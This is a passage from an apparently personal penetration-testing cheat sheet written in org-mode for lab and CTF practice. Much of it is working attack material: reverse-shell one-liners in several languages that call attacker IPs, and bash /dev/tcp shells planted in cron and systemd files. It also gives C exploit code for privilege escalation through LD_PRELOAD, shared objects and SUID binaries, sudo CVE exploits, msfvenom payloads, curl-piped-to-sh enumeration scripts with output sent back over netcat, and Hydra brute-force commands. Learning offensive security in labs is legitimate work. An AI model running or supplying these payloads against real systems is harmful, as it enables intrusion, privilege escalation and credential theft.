python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.46",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#+end_src

******* Php
#+begin_src
php -r '$sock=fsockopen("10.4.0.46",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
#+end_src

******* Ruby
#+begin_src ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
#+end_src

******* Java
#+begin_src java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
#+end_src

****** Extra netcat commands

******* Port scanning
#+begin_src bash
nc -zvn -w 1 10.10.52.1 1-1000
#+end_src

******* Sending files
#+begin_src bash
nc -q 5 -lvnp 80 < linpeas.sh
#+end_src

******* Connect to FTP server with ProFTPd
#+begin_src bash
nc 10.10.195.28 21
#+end_src

**** First steps after getting reverse shell
***** Check host info
#+begin_src bash
uname -a
id
ps aux
ls -lah
ls /home
cat /etc/passwd && cat /etc/info
#+end_src

***** Upgrade shell
****** Python psuedo bash terminal
Use python to get a psuedo bash terminal
#+begin_src bash
python -c 'import pty; pty.spawn("/bin/bash")'
#+end_src

****** Get full bash shell with stty
Get python psuedo terminal
=Ctrl-Z= to background task

Make sure you're using bash on your attack machine
#+begin_src bash
ps -p $$ #if you're using zsh, switch to bash by typing bash
#+end_src

Find attack machine's terminal info
#+begin_src bash
echo $TERM #usually xterm-256color
stty -a #make notes of rows and cols
#+end_src

Echo all keystrokes to attack's machine
#+begin_src bash
stty raw -echo
fg
#+end_src

In reverse shell,
#+begin_src bash
reset #this makes terminal normal again
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <columns> #use the rows and cols number gathered from stty -a
#+end_src

And that's it.
****** Socat method
If =socat= is installed, use this method.

Listener
#+begin_src bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
#+end_src

Victim
#+begin_src bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
#+end_src

**** Linux exploitation
***** Find files
Find files owned by user
#+begin_src bash
find / -user "Hp" -name "*" > /tmp/result.txt
#+end_src

Find files that include name
#+begin_src bash
find / -name "*ping*" > /tmp/result.txt
#+end_src

Grep out files without permission
#+begin_src bash
cat /tmp/result.txt | grep -v "denied"
#+end_src

Include this to not show perm denied results
#+begin_src bash
2>/dev/null
#+end_src

***** Sudoers files
****** Syntax
#+begin_quote
Syntax: User <space> OnHost = (Runas-User:Group) <space> Commands
*Example: root ALL = (ALL:ALL) ALL*
Read it as — User *Root* can *Run Any Command* as *Any User* from *Any Group* on *Any Host*.
#+end_quote

*Explanation*
#+begin_quote
- The first ALL is used to define HOSTS. We can define Hostname/Ip-Address instead of ALL. ALL means any host.
- Second ALL:Third ALL is User:Group. Instead of ALL we can define User or User with the group like User:Group. ALL:ALL means All users and All groups.
- Last ALL is the Command. Instead of ALL, we can define a command or set of commands. ALL means all commands.
#+end_quote

****** Example
#+begin_src bash
sysadmin ALL = (root) /usr/bin/cat /etc/shadow
#+end_src

=Read this as — User “sysadmin” can Run the command “/usr/bin/cat /etc/shadow” as ROOT user on all the HOSTS.=

***** Useful commands for pentesting
#+begin_src bash
cut -d: -f1 /etc/passwd
ls
id
uname -a
cut -d: -f1,3 /etc/passwd | egrep ':[0-9]{4}$' | cut -d: -f1 #list all human users
cat /etc/passwd
cat /etc/os-release #os info
cat /etc/crontab
find / -name xyz* #find any files with name xyz
#+end_src
***** Redirect url with =etc/hosts=
#+begin_src bash
vim /etc/hosts
#+end_src

If a file is calling an URL, and you have permission to edit the host file, you can redirect the URL to another IP Adrress (preferably your attack box address).

**** Privilege escalation (PrivEsc)
***** MySQL exploit
Works on MySQL service running with root permissions and no root password

Get exploit file
[[https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c]]

Copy the exploit file to remote directory.
#+begin_src bash
rsync ~/raptor_udf2.c user@ssh.ip:~/
#+end_src

Compile in remote (or local)
#+begin_src bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
#+end_src

Run MySQL with root account
#+begin_src bash
mysql -u root
#+end_src

Create custom function
#+begin_src sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
#+end_src

Run function
#+begin_src sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
#+end_src

Got root
#+begin_src bash
/tmp/rootbash -p
#+end_src

***** etc/passwd or etc/shadow weak permissions
Check if =passwd= or =shadow= is user read/writable
#+begin_src bash
ls -l /etc/passwd
#+end_src

Save the hashes and use =john= to crack

OR replace hashes with your own and put it in =/etc/shadow= (or =/etc/passwd= if the linux distro is older)
#+begin_src bash
mkpasswd -m sha-512 newpasswordhere
#+end_src

***** Outdated sudo exploit/Sudo CVEs
****** Sudo < 1.8.28 - Security bypass
[[https://www.exploit-db.com/exploits/47502][CVE-2019-14287]] exploit. The bug is fixed in sudo 1.8.28.

Check if applicable. If sudo is configured so that =(All, !root)= is present, and the sudo binary is < 1.8.28, then the machine is exploitable
#+begin_src bash
sudo -l

### User hacker may run the following commands on kali:
###    (ALL, !root) /bin/bash
#+end_src

And sudo version.
#+begin_src bash
sudo -V

### Sudo version 1.8.21p2
#+end_src

Exploit
#+begin_src bash
sudo -u#-1 /bin/bash ## run the program that's shown with sudo -l
#+end_src

****** Sudo < 1.8.26 - Buffer Overflow
If =pwfeedback= is set in =/etc/sudoers= file, you can perform a buffer overflow attack on unpatched sudo versions.

[[https://github.com/saleemrashid/sudo-cve-2019-18634][Payload]]

***** Sudo shell escape sequences
You can get a shell from some programs (=vim=, =nmap=), etc. If those programs are given sudo permissions, you can get a root shell from breaking out of said programs.

Check programs with sudo permissions with:
#+begin_src bash
sudo -l
#+end_src

View which programs can get you a shell on this site.
[[https://gtfobins.github.io/]]

***** Sudo environment variables
****** Check if exploitable
#+begin_src bash
sudo -l
#+end_src
Check which environment variables are inherited (look for the env_keep options)

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

****** LD_PRELOAD
Exploit code:
#+begin_src c++
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
#+end_src

Compile:
#+begin_src bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
#+end_src

Run program:
#+begin_src bash
sudo LD_PRELOAD=/tmp/preload.so program-name-here
#+end_src

****** LD_LIBRARY_PATH
Exploit code:
#+begin_src c++
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
#+end_src

Run ldd against the apache2 program file to see which shared libraries are used by the program:
#+begin_src bash
ldd /usr/sbin/apache2
#+end_src

Compile:
#+begin_src bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
#+end_src

Run program with path to the library:
#+begin_src bash
sudo LD_LIBRARY_PATH=/tmp apache2
#+end_src

It should spawn a rootshell before opening the actual program.

***** Cron jobs
****** Command
View crontab contents
#+begin_src bash
cat /etc/crontab
#+end_src

****** File permissions
If there's a file with user/world writable permissions:
#+begin_src bash
ls -l /usr/local/bin/overwrite.sh
#+end_src

Replace its content:
#+begin_src bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
#+end_src

And then run a reverse shell on attackbox:
#+begin_src bash
nc -nvlp 4444
#+end_src

****** PATH environment variable
If path starts with an unsecure directory (=~/= for example) and the job doesn't use an absolute path (say =/usr/local/=), you can create a file with the same name as the file in crob jobs in that directory.

Content:
#+begin_src bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
#+end_src

Set permission:
#+begin_src bash
chmod +x /home/user/overwrite.sh
#+end_src

And then wait for the cron job to run

****** Wildcards (+ a tar exploit)
This example exploit is used in tandom with a =tar= exploit, but the concept is simple.

If a cron job script is run with a =*=, you can put arbitrary files in that directory for it to run.

[[https://gtfobins.github.io/gtfobins/tar/][Tar has a feature to break out to an interactive shell or run arbitrary commands.]]
#+begin_src bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
#+end_src

Create an exploit binary on attacker machine and transfer it to victim:
#+begin_src bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
scp shell.elf user@ip.address:~/
chmod +x ~/shell.elf
#+end_src

*Tar exploit:*
Create these empty files
#+begin_src bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
#+end_src

Tar runs and doesn't sanitize its input, so it recogize those files as flags for its command and then run the exploit file.

***** SUID/SGID Executables (misconfigured permissions)
****** Find executables
Find all the SUID/SGID executables (executables with special permissions)
#+begin_src bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
#+end_src

Find SUID executables only
#+begin_src bash
find / -type f -a -perm -u+s -exec ls -l {} \; 2> /dev/null
#+end_src

Find SGID executables only
#+begin_src bash
find / -type f -a -perm -g+s -exec ls -l {} \; 2> /dev/null
#+end_src

****** Notable programs
******* Systemctl (systemd)
=/bin/systemctl= shouldn't have special permissions (SUID). If found, you can exploit it by creating arbitrary systemd jobs.
#+begin_src bash
vim /tmp/root.service
#+end_src

File content
#+begin_src bash
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.3.60/4444 0>&1'

[Install]
WantedBy=multi-user.target
#+end_src

Set up a listener on attack machine
#+begin_src bash
nc -nlvp 4444
#+end_src

Run the malicious systemd service
#+begin_src bash
/bin/systemctl start /tmp/root.service
#+end_src

******* Strings
******* Nmap
If nmap has SUID permissions
#+begin_src bash
nmap --interactive
!bash
whoami
exit
!sh
whoami
#+end_src

[[https://vk9-sec.com/nmap-privilege-escalation/][Read more]]

****** Known exploits
Find known exploits for questionable executates with [[https://www.exploit-db.com/]]
[[https://gtfobins.github.io/]]

****** Shared object injection
Run strace on the suspicious file and search the output for open/access calls and for "no such file" errors:
#+begin_src bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
#+end_src

Put a file that's named after a "no such file" name found.
*File:*
#+begin_src c++
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
#+end_src

*Compile:*
#+begin_src bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
#+end_src

Execute the file again to get the shell
#+begin_src bash
/usr/local/bin/suid-so
#+end_src

****** Environment variables
Find string information in suspicious files.
#+begin_src bash
strings /usr/local/bin/suid-env
#+end_src

If a service or a program is being called without full path (=service apache2 start=), you can replace it with your arbitrary program.

Compile malicious binary.
Source:
#+begin_src c++
int main() {
    setuid(0);
    system("/bin/bash -p");
}
#+end_src

Compile:
#+begin_src bash
gcc -o service /home/user/tools/suid/service.c
#+end_src

Prepend current directory to path and run the program again.
#+begin_src bash
PATH=.:$PATH /usr/local/bin/suid-env
#+end_src
****** Binary expoitation (Buffer overflow)
Some SUID/SGID program binaries can be exploited by inspecting its I/O (C and Assembly knowledge required, most definitely).

Readings:
[[http://docs.pwntools.com/en/latest/]]
[[http://docs.pwntools.com/en/latest/]]
[[https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10]]

****** Shell features/bugs
******* Outdated bash (before 4.2-048) #1
In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed is less than 4.2-048:
#+begin_src bash
/bin/bash --version
#+end_src

Create a Bash function with the name =/usr/sbin/service= that executes a new Bash shell (using -p so permissions are preserved) and export the function:
#+begin_src bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
#+end_src

Run the executable that runs the =service= function to gain a root shell.
#+begin_src bash
/usr/local/bin/suid-env2
#+end_src

******* Outdated bash (before 4.4) #2
When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
#+begin_src bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
#+end_src

Run =/tmp/rootbash -p= to gain the root shell.

****** Reminder: use =-p= arguments for bash to keep file privileges
***** Search for credentials in popular places (=IN ALL USERS DIRECTORIES=)
****** History files
#+begin_src bash
cat ~/.*history | less
#+end_src

****** Config files
#+begin_src bash
cat /home/user/myvpn.ovpn
#+end_src

****** SSH files
#+begin_src bash
ls ~/.ssh
#+end_src

Copy to your machine and set the right permissions
#+begin_src bash
chmod 600 root_key
#+end_src

Use the key to log in again
#+begin_src bash
ssh -i root_key root@10.10.196.77
#+end_src

***** NFS
NFS files inherit the *remote* user's ID. If root squashing is enabled, root user is set to nobody instead.

Check the NFS share configuration for =no_root_squash=
#+begin_src bash
cat /etc/exports
#+end_src

The directory =/tmp= has root squashing disabled.

*Switch to root with =sudo su= on attacker machine.*

Mount the directory
#+begin_src bash
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
#+end_src

Generate a payload with root privileges and set permission
#+begin_src bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
#+end_src

Run the file from victim's machine
#+begin_src bash
/tmp/shell.elf
#+end_src

***** Kernel exploits
Find exploit modules with program.
#+begin_src bash
perl linux-exploit-suggester-2.pl
#+end_src

Find exploits, compile and run.
#+begin_src bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
#+end_src

***** PrivEsc scripts
****** LinPEAS
[[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS]]

*Usage:*
#+begin_src bash
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
python -m S http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
#+end_src

*Flags:*
- *-a (all checks except regex) - This will execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using su with the top2000 passwords.*
- -e (extra enumeration) - This will execute enumeration checkes that are avoided by default
- -r (regex checks) - This will search for hundreds of API keys of different platforms in the silesystem
- -s (superfast & stealth) - This will bypass some time consuming checks - Stealth mode (Nothing will be written to disk)
- -P (Password) - Pass a password that will be used with sudo -l and bruteforcing other users
- -D (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
- -d/-p/-i/-t (Local Network Enumeration) - Linpeas can also discover and port-scan local networks

****** LinEnum
[[https://github.com/rebootuser/LinEnum]]

Usage
#+begin_src bash
# Local network
python -m S http.server 80 #Host
curl 10.10.10.10/linenum.sh | sh #Victim

# Without curl
nc -q 5 -lvnp 80 < linenum.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linenum.out #Host
curl 10.10.14.20:8000/linenum.sh | sh | nc 10.10.14.20 9002 #Victim
#+end_src

This scripts is smaller in scope, and therefore better for beginners like me to wrap my head around.

****** PostEnum.sh
[[https://github.com/mostaphabahadou/postenum]]

Smaller in scope, gives better results in a limited environment.

*** Router and IOC hacking
Mostly are linux embedded machines -> Follow Linux hacking methodology

[[https://github.com/threat9/routersploit][Routersploit for automated vulnerability scanning]]

[[https://github.com/foreni-packages/cisco-global-exploiter][Cisco global exploiter]] (cge.pl) to find Cisco based vulnerability

*** Windows hacking
**** SMB bruteforcing
Enumerate all SMB information
#+begin_src bash
enum4linux -a 10.10.10.10
#+end_src

Connect to a smb server from linux
#+begin_src bash
smbclient <ip> -U <user>
#+end_src

**** Privilege escalation (PrivEsc)

*** TODO Phishing
*** Password cracking
**** Crackstation - Crack easy passwords
Visit [[https://crackstation.net/]]

**** Hydra - Web/network password cracking
***** Introduction and applicable protocols
Used to bruteforce passwords of online password forms and inputs.
[[https://en.kali.tools/?p=220]]

#+begin_quote
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.
#+end_quote

***** Usage
****** Authorization header/Popup form bruteforce
#+begin_src bash
hydra -V -I -L top500user.txt -P rockyou75.txt 192.168.0.121 -s 55000 http-get /
#+end_src

****** SSH bruteforce
#+begin_src bash
hydra -l <username> -P <full path to pass> 10.10.67.51 -t 4 ssh -s 22 -V -I
#+end_src﻿

Note: Substitute -l for -L for an userlist

****** HTML form bruteforce (HTML POST)
#+begin_src bash
hydra -l <username> -P <wordlist> 10.10.67.51 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
#+end_src

Explanation
| http-post-form | Type of attack. Use https-post-form for https |
| =/login.php=   | Url of login form.                            |
| =^USER^=       | Username(s) used by hydra                     |
| =^PASS^=       | Passwords(s) used by hydra                    |
| =:F=incorrect= | Incorrect message printed out by website      |

Format: ~username=^USER^&password=^PASS^~
Find out the format of the post form by inspecting the raw data of the POST message, OR the name of the input html (double check to be sure)

****** FTP bruteforce
#+begin_src bash
hydra -l user -P passlist.txt ftp://10.10.161.236
#+end_src

/Use =get= to download file from ftp server./

****** SMB bruteforce
#+begin_src bash
hydra -l <username> -P <full path to pass> 10.10.67.51 smb -V
#+end_src﻿

**** Hash cracking
***** Hash type
Find hash type with =hash-identifier= on kali

Popular hash types formatting:

#+begin_quote
48bb6e862e54f2a795ffc4e541caed4d #md5
CBFDAC6008F9CAB4083784CBD1874F76618D2A97 #sha1
1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 #sha256
$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom #bcrypt or #blowfish
$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02. #sha512crypt
e5d8870e5bdd26602cab8dbe07a942c8669e56d6 #sha1 with salt (tryhackme in this instance)
#+end_quote

Use linux commands to filter wordlists
#+begin_src bash
sed 's/[^[:alpha:][:blank:]]//g' file.txt > new.txt #filter special characters
awk 'length<5' file.txt > new.txt #filter lines with less than 5 chars
#+end_src

***** John
****** Usage
Commands:
#+begin_src bash
john pass.txt --wordlist=~/wordlists/rockyou.txt --format:raw-sha256
#+end_src

Popular formats:
#+begin_quote
raw-sha256
raw-md5
lm
#+end_quote

****** Cracking zips with John
#+begin_src bash
zip2john file.zip > file.hash
john file.hash
#+end_src

****** Cracking ssh private key (id_rsa) with John
#+begin_src bash
ssh2john sshkey > key.hash
john key.hash # --wordlists=wordlists/rockyou.txt
#+end_src

Use the hash password when prompted from this command:
#+begin_src bash
ssh -i sshkey.key user@ip
#+end_src

***** Hashcat
Command:
#+begin_src bash
hashcat -O -a 0 -m 1400 <hash/hashfile> <wordlist>
#+end_src

Attack mode (=-a=)
| 0 | Dictionary                                          |
| 1 | Combinator (Concat words from multiple wordlists)   |
| 3 | Bruteforce/mask attack (try all chars from charset) |
| 6 | Wordlist+mask                                       |
| 7 | Mask+wordlist                                       |
| 9 | Association attack (use hint to bruteforce)         |

Popular hash types (=-m=)
|  1400 | SHA2-256                  |
| 17400 | SHA3-256                  |
|   900 | MD4                       |
|  1000 | NTLM                      |
|     0 | MD5                       |
|  1800 | sha512crypt (/etc/shadow) |
|   100 | sha1                      |
|   110 | sha1 ($pass:$salt)        |
|   120 | sha1 ($salt:$pass)        |
|   160 | HMAC-SHA1 ( key = $salt ) |

[[https://hashcat.net/wiki/doku.php?id=example_hashes][All types]]

View cracked passwords:
#+begin_src bash
hashcat --show pass.txt -m 1800 #mode cracked
#+end_src

***** Remember to use online tools too, less taxing on system and can decrypt popular hashes faster
*** Reverse engineering
**** Elf binary (Linux/C++ binary)
***** Basic reverse engineering
#+begin_src bash
strings file
#+end_src

***** Using gdb debugger
#+begin_src bash
gdb file
#+end_src

Inside gdb
#+begin_src bash
info functions #list functions of file
b *0x00000000.... #set breakpoint
run test
info registers
x/s 0x7fffffffe030 #print strings at the memory address
#+end_src

***** Ghidra - Looking at source code

** TODO Post Exploitation
*** TODO Persistent shell
*** Extract credentials and files

** Extras
*** Covering your tracks
**** Macchanger
#+begin_src bash
#!/bin/sh
ip link set dev wlp1s0 down
macchanger -r wlp1s0
ip link set dev wlp1s0 up
#+end_src

*** Encode/decode/decryption/ciphers
**** Base64
Base64 and base32 usually has the equal sign ~=~ at the end. That's the padding for the last empty bit of a block.
#+begin_quote base64
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
#+end_quote

#+begin_src bash
echo 'encodedtext' | base64 -d
#+end_src

**** Base32
#+begin_quote base32
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
#+end_quote

#+begin_src bash
echo 'encodedtext' | base32 -d
#+end_src

**** Hexadecimal
If there's only numbers and =a-f=, decent odds it's hex
#+begin_quote hex
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
#+end_quote

**** Decimal
Just numbers
#+begin_quote
85 110 112 97 99 107 32 116 104 105 115 32 66 67 68
#+end_quote

**** Binary
Just zeroes and ones (char count divisible by 8)
#+begin_quote
01100110 01100101 00100000 01100000 01011111 01100000 00100000 01100000 01100000 01100101 00100000 01100010 01101000 00100000 01100000 01100000 01100100 00100000 01100010 01100001 00100000 01100000 01011111
#+end_quote

**** Rot13/caesar cipher (shift)
[[https://www.dcode.fr/caesar-cipher][Decode]]

If the string looks like it's been scrambled (look at spacing and special characters), it's usually shift encoded.
#+begin_src rot13
Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F
#+end_src

**** Rot47 (shift)
[[https://www.dcode.fr/rot-47-cipher][Decode]]

It's like rot13, but it encodes all the special characters, instead of just alphabet.
#+begin_quote
*@F DA:? >6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:>6DX
#+end_quote

**** Morse code
Only 2 characters and space
#+begin_src
- . .-.. . -.-. --- -- -- ..- -. .. -.-. .- - .. --- -.
. -. -.-. --- -.. .. -. --.
#+end_src

# /home/hp/Pictures/2022-11-10_11-46.png https://peterconfidential.com/wp-content/uploads/2022/11/2022-11-10_11-46.png
